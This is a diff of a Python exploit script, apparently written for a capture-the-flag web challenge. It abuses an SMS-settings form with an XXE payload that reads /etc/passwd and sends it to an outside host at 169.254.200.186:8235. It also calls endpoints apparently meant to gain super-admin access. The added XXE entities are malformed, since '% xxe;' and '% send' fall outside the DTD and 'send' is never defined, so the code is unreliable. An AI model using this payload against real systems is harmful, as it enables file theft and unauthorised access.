@@ -144,7 +144,6 @@ class WebExp:
         cookie=re.search(r'/\w+=*\s',buf).string
         cookie=cookie.strip().split('/')[1]
         cookie=base64.b64decode(cookie)
-
         value=re.search(r'"(.+)"', cookie)
         if value:
             value=value.group(1)
@@ -161,33 +160,26 @@ class WebExp:
         rs=self.session.post(url=self.url+'settings/sms',data={
             self.csrfname: token,
             "force_phone_check": "on",
-            "api_url":"http://10.85.6.104:8200/api/send_sms",
+            "api_url":"http://10.85.6.104:8848/sms.php",
             "method":"1",
             "name":"data",
             "template":u'''
             <?xml version="1.0" encoding="utf-8"?>
-            <!DOCTYPE remote SYSTEM "http://169.254.200.186:8000/payload.dtd" >
+            <!DOCTYPE ANY [
+            <!ENTITY % file SYSTEM "file:///etc/passwd">
+            <!ENTITY % xxe SYSTEM "http://169.254.200.186:8235/?%file;" >
+            ]>
+            % xxe;
+            % send
             <root>;
                 <tel>{tel}</tel>
-                <text>【VYG乐购】您的验证码为： {code} &remote;</text>
+                <text>【VYG乐购】您的验证码为： {code} </text>
             </root>
             '''
         })
         #print rs.text
-        self.session.cookies.clear()
-        self.register_test()
-        s = socket.socket()
-        s.bind(("127.0.0.1", 8235))
-        s.listen(5)
-        print("start listening ...")
-        while True:
-            con, address = s.accept()
-            buf = con.recv(1024)
-            if 'GET' in buf:
-                break
-
-        print buf
-
+        print "soluntion1:"+self.session.get('http://127.0.0.1:8233/user/check/regen').text
+        print "soluntion2:"+self.session.get('http://127.0.0.1:8233/user/2?super_admin_mode=1').text
         return True
 
 def exp(host, port):
